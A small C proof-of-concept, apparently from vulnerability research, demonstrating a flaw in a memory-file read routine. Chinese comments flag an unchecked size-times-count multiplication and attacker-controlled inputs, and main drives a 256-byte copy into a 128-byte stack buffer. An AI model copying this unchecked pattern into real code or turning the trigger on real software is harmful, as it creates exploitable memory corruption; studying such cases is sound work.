#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdint.h>
#include <limits.h>
#include <string.h>

typedef ptrdiff_t mpos_t;

typedef struct {
	const uint8_t *start;
	mpos_t pos;
	mpos_t size;
} MFILE;

static inline ptrdiff_t CAN_READ(MFILE *m)
{
	if (m->size >= 0)
		return m->pos >= 0 ? m->size - m->pos : 0;
	return INT_MAX;
}

static size_t mread(void *buf, size_t size, size_t num, MFILE *m)
{
	size_t should_read = size * num;   // <-- 漏洞点: 无溢出检查
	ptrdiff_t can_read = CAN_READ(m);

	if (!size || !num || can_read <= 0) {
		return 0;
	}
	if (should_read > can_read) {
		should_read = can_read;
	}
	memcpy(buf, m->start + m->pos, should_read);
	return should_read / size;
}

static MFILE *mopen(const void *ptr, long size)
{
	MFILE *m = malloc(sizeof(MFILE));
	if (m == NULL)
		return NULL;
	m->start = ptr;
	m->pos = 0;
	m->size = size;
	return m;
}

static int mclose(MFILE *m)
{
	free(m);
	return 0;
}

int main(void)
{
	uint8_t *src_buf = malloc(256);
	if (!src_buf) return 1;
	MFILE *mf = mopen(src_buf, 256);

	uint8_t out[128];   // <-- 栈上 128 字节缓冲区

	size_t item_size = 0x40000002UL;  // 攻击者控制
	size_t item_cnt  = 2;             // 攻击者控制

	fprintf(stderr, "size*num = 0x%zx\n", item_size * item_cnt);
	size_t ret = mread(out, item_size, item_cnt, mf);
	fprintf(stderr, "mread returned %zu items\n", ret);

	mclose(mf);
	free(src_buf);
	return 0;
}

